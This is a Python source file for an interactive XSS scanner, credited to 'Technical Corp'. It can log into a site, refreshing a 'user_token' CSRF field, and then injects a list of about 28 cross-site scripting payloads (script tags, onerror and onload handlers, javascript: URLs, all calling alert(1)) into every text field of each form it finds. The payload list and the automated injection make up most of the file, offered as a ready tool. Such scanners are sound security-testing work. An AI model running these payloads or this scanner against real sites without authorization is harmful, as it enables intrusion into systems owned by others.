import requests
from bs4 import BeautifulSoup
import urllib.parse
import colorama
from colorama import Fore, Style
import sys

colorama.init(autoreset=True)

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "';alert(1);//",
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<math href="javascript:alert(1)">click</math>',
    '"><body onload=alert(1)>',
    '"><svg onload=alert(1)>',
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '"><img src="javascript:alert(1)">',
    '<link rel="stylesheet" href="javascript:alert(1)">',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '<table background="javascript:alert(1)">',
    '<div style="background-image:url(javascript:alert(1))">',
    '<input type="button" onclick="alert(1)">',
    '<button onclick="alert(1)">Click me</button>',
    '"><svg/onload=alert(1)>',
    '"><details/open/ontoggle=alert(1)>',
    '"><a href="javascript:alert(1)">Click me</a>',
    '<marquee onstart=alert(1)>',
    '<base href="javascript:alert(1)//">',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<meta charset="x-user-defined"><script>alert(1)</script>',
    '<isindex type=image src=1 onerror=alert(1)>'
]

def is_vulnerable(response, payload):
    return payload in response.text

def scan_url(url, session=None):
    try:
        response = session.get(url) if session else requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        print(Fore.CYAN + f"\nFound {len(forms)} forms on {url}\n")

        for form in forms:
            form_details = get_form_details(form)
            target_url = form_details['action']
            if not target_url.startswith('http'):
                target_url = urllib.parse.urljoin(url, target_url)

            for payload in XSS_PAYLOADS:
                data = {}
                for input_tag in form_details['inputs']:
                    if input_tag['type'] in ['text', 'search', 'url', 'email', 'textarea']:
                        input_tag['value'] = payload
                    data[input_tag['name']] = input_tag['value']

                if 'user_token' in data:
                    data['user_token'] = get_csrf_token(session or requests, url)

                if form_details['method'] == 'post':
                    response = session.post(target_url, data=data) if session else requests.post(target_url, data=data)
                else:
                    response = session.get(target_url, params=data) if session else requests.get(target_url, params=data)

                if is_vulnerable(response, payload):
                    print(Fore.GREEN + f"[+] XSS vulnerability found in form at {target_url} with payload: {payload}")
                    return

        print(Fore.RED + "[-] No XSS vulnerabilities found.")
    
    except Exception as e:
        print(Fore.RED + f"[!] Error scanning {url}: {e}")

def get_form_details(form):
    details = {}
    action = form.attrs.get('action', '')
    method = form.attrs.get('method', 'get').lower()
    inputs = []

    for input_tag in form.find_all('input'):
        input_name = input_tag.attrs.get('name')
        input_type = input_tag.attrs.get('type', 'text')
        input_value = input_tag.attrs.get('value', '')
        inputs.append({'name': input_name, 'type': input_type, 'value': input_value})

    for textarea in form.find_all('textarea'):
        textarea_name = textarea.attrs.get('name')
        textarea_value = textarea.string if textarea.string else ''
        inputs.append({'name': textarea_name, 'type': 'textarea', 'value': textarea_value})

    for select in form.find_all('select'):
        select_name = select.attrs.get('name')
        select_value = ''
        if select.option:
            select_value = select.option.attrs.get('value')
        inputs.append({'name': select_name, 'type': 'select', 'value': select_value})

    details['action'] = action
    details['method'] = method
    details['inputs'] = inputs
    return details

def get_csrf_token(session, url):
    response = session.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    token = soup.find('input', {'name': 'user_token'})
    return token['value'] if token else None

def authenticate(session, login_url, username, password):
    login_page = session.get(login_url)
    soup = BeautifulSoup(login_page.content, 'html.parser')
    token_elem = soup.find('input', {'name': 'user_token'})
    token = token_elem['value'] if token_elem else None

    payload = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    
    if token:
        payload['user_token'] = token

    response = session.post(login_url, data=payload)
    return response

def main():
    print(Fore.MAGENTA + Style.BRIGHT + "\nWelcome to XSS Vulnerability Scanner Tool")
    print(Fore.CYAN + "Tool by: Technical Corp\n")
    
    start_scan = input("Are you ready to scan a website or webapp? (y/n): ").strip().lower()

    if start_scan != 'y':
        print(Fore.YELLOW + "\nGoodbye!")
        sys.exit()

    url = input("\nEnter the URL to scan for XSS vulnerabilities: ")
    auth_required = input("Does the website require authentication? (yes/no): ").strip().lower()

    session = None
    if auth_required == 'yes':
        session = requests.Session()
        login_url = input("Enter the login URL: ")
        username = input("Enter the username: ")
        password = input("Enter the password: ")
        login_response = authenticate(session, login_url, username, password)
        if 'Login failed' in login_response.text:
            print(Fore.RED + "[!] Login failed. Please check your credentials.")
            sys.exit()
        else:
            print(Fore.GREEN + "[+] Logged in successfully.")

    print(Fore.CYAN + f"\nStarting scan on {url}...\n")
    scan_url(url, session)
    print(Fore.CYAN + "\nScan completed.\n")

if __name__ == "__main__":
    main()
